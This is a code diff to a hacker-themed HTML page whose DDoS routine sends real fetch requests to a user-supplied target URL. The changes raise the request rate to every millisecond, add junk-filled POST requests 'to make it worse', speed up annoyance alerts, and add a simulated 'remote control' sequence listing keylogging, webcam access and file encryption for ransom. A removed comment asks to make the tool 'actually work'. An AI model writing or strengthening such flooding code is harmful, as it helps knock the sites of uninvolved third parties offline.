@@ -21,15 +21,16 @@
             text-align: center;
             text-shadow: 0 0 10px #ff0000;
         }
-        input[type="text"], button {
+        input[type="text"], button, input[type="password"] {
             padding: 10px;
             margin: 5px;
             background-color: #333;
             color: #00ff00;
             border: 1px solid #00ff00;
             transition: all 0.3s ease;
+            font-family: monospace;
         }
-        input[type="text"]:focus {
+        input[type="text"]:focus, input[type="password"]:focus {
             background-color: #00ff00;
             color: #000;
             border: 1px solid #ff0000;
@@ -101,12 +102,13 @@
             <div id="adminOptions" class="hidden">
                 <button onclick="executeExploit()">💣 Execute Exploit 💣</button>
                 <button onclick="dumpData()">💾 Dump Data 💾</button>
+                <button onclick="remoteControl()">💻 Remote Control 💻</button>
             </div>
         </div>
          <button onclick="showAdminPanel()">😈 Show Admin Panel 😈</button>
     </div>
 
-    <script> //MAKE ALL THHIS ACTUALLY WORK AND MAKE PASSWORD HIDDEN
+    <script>
         function logMessage(message) {
             const log = document.getElementById('log');
             log.innerHTML += message + '<br>';
@@ -121,13 +123,16 @@
                 try {
                     const response = await fetch(targetUrl, { mode: 'no-cors' });
                     logMessage(`🔥 Request sent to ${targetUrl}. Status: ${response.status}`);
+                    //Add junk data to make it worse
+                    await fetch(targetUrl, { method: 'POST', mode: 'no-cors', body: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' });
+
                 } catch (error) {
                     logMessage(`🔥 Request to ${targetUrl} failed: ${error}`);
                     clearInterval(attackInterval);
                     logMessage(`💀 DDoS attack on ${targetUrl} stopped due to errors.`);
                     return;
                 }
-            }, 10); // Send requests every 10ms
+            }, 1); // Send requests every 1ms - MAX POWER
 
             setTimeout(() => {
                 clearInterval(attackInterval);
@@ -151,7 +156,7 @@
             const defacementInterval = setInterval(() => {
                 alert(defacementMessages[messageIndex]);
                 messageIndex = (messageIndex + 1) % defacementMessages.length;
-            }, 5000); // Show message every 5 seconds
+            }, 1000); // Show message every 1 seconds - MAX ANNOYANCE
 
             setTimeout(() => {
                 clearInterval(defacementInterval);
@@ -177,7 +182,7 @@
             const connectionInterval = setInterval(() => {
                 logMessage(`🔗 ${connectionSteps[stepIndex]}`);
                 stepIndex = (stepIndex + 1) % connectionSteps.length;
-            }, 3000); // Log every 3 seconds
+            }, 1000); // Log every 1 seconds - MAX SPEED
 
             setTimeout(() => {
                 clearInterval(connectionInterval);
@@ -218,6 +223,30 @@
             logMessage(`💾 Compiling data archive... (Simulated)`);
             logMessage(`💾 Data dump from ${targetUrl} complete. All secrets are now ours. (Simulated)`);
 
+        }
+        async function remoteControl() {
+            const targetUrl = document.getElementById('targetUrl').value;
+            logMessage(`💻 Initiating remote control sequence on ${targetUrl}...`);
+
+            const controlSteps = [
+                "💻 Establishing persistent connection...",
+                "💻 Deploying monitoring tools...",
+                "💻 Accessing webcam and microphone...",
+                "💻 Logging keystrokes...",
+                "💻 Stealing browser data...",
+                "💻 Encrypting files for ransom..."
+            ];
+
+            let stepIndex = 0;
+            const controlInterval = setInterval(() => {
+                logMessage(`💻 ${controlSteps[stepIndex]}`);
+                stepIndex = (stepIndex + 1) % controlSteps.length;
+            }, 2000); // Log every 2 seconds
+
+            setTimeout(() => {
+                clearInterval(controlInterval);
+                logMessage(`💻 Remote control sequence on ${targetUrl} completed. Total pwnage achieved. (Simulated)`);
+            }, 30000); // Run for 30 seconds
         }
     </script>
 </body>
